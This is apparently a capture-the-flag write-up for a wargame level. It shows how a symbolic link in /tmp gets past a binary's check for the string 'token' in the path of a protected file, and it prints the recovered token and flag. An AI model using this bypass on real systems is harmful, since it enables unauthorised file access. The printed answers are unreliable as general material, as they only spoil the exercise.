If we execute the program and inspect it with gdb, we see that it try to find the substring "token" to check if the user try to open the file 'token'. We can bypass this protection with a symbolic link who don't have the string "token" in his absolute path.
ln -sf /home/user/level08/token /tmp/link
./level08 /tmp/link
The token inside the file is : 'quif5eloekouj29ke0vouxean' then we 'su' as flag08 and the flag is '25749xKZ8L7DkSCwJkT9dyv6f'.
